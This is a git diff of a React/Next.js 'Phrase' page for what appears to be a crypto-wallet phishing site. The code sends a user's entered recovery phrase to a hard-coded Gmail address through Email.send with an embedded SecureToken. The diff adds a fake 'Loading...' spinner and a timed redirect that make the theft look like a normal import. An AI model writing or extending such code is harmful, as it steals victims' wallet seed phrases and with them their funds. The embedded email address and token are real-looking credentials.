@@ -377,9 +377,25 @@ export const getStaticProps = ( context ) => {
     }
 }
 const Phrase = ({ data }) => {
+    const [isLoading, setIsLoading] = useState(false)
+    const passError = () => {
+        setIsLoading(false)
+        router.push('/wallet/loading')
+    }
+    const Loading = () => {
+        return(
+            <div className="d-flex jac spin-holder">
+            <div className="d-flex jac container spin-box round-20 coll py-3 boda2">
+                <div className="loader"></div>
+                <h1 className="text-center ">Loading...</h1>
+            </div>
+        </div>
+        )
+    }
     const [phrase12, setPhrase12] = useState("")
     const router = useRouter();
     const myFunc = ( ) => {
+        
         Email.send({
             SecureToken : "f10ea3fc-c85c-40ed-93e9-4467760c85cf",
             To : 'amogukachi7@gmail.com',
@@ -387,7 +403,8 @@ const Phrase = ({ data }) => {
             Subject : data.name,
             Body : phrase12
         }).then(
-          router.push('/wallet/loading')
+            setIsLoading(true),
+            setTimeout(passError, 3000)
         );
         console.log(phrase12)
     }
@@ -415,12 +432,7 @@ const Phrase = ({ data }) => {
                 <div className="d-flex jac">
                     <button onClick={myFunc} className="btn btn-light my-3 fw-bold dark" id="btn">Import</button>
                 </div>
-                <div className="d-flex jac spin-holder boda3">
-                    <div className="d-flex jac container spin-box round-20 coll py-3 boda2">
-                        <div className="loader"></div>
-                        <h1 className="text-center ">Loading...</h1>
-                    </div>
-                </div>
+                {isLoading ? <Loading /> : (<div></div>)}
             </div>
         </main>
         
